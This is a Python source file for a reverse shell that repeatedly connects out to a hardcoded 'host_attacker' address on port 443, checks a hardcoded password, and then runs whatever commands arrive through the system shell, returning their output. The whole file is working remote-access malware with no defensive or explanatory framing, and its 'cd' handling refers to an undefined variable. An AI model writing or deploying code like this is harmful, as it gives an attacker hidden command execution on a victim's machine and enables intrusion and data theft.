import subprocess
import socket
import time
import os

class Server:
	def __init__(self):
		self.host_attacker = "192.168.2.30"
		self.port = 443
		self.password = "1234"

	def getDirPath(self):
		return os.getcwd() + ": "

	def getSocket(self):
		while True:
			try:
				s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
				s.connect((self.host_attacker,self.port))
				return s
			except:
				print("Connecting...")
				time.sleep(6)
				continue

	def login(self, sck):
		login = "Login: "
		sck.send(login.encode())
		pwd = sck.recv(1024)
		if pwd.decode().strip() != self.password:
			self.login(sck)

		sck.send(self.getDirPath().encode())
		self.shell(sck)

	def shell(self, sck):
		while True:
			data = sck.recv(1024)
			if data.decode().strip() == "exit":
				sck.close()
				break

			try:
				cmd, params = data.decode().split(" ", 1)
				if cmd.strip() == "cd":
					os.chdir(params.strip())
					s.send(self.getDirPath().encode())
					continue
			except:
				pass

			proc = subprocess.Popen(data.decode().strip(), shell = True, stdout = subprocess.PIPE, stderr = subprocess.PIPE, stdin = subprocess.PIPE)
			output = proc.stdout.read() + proc.stderr.read()
			sck.send(output)
			sck.send(self.getDirPath().encode())


def main():
	server = Server()
	socket = server.getSocket()
	server.login(socket)

if __name__ == "__main__":
	main()
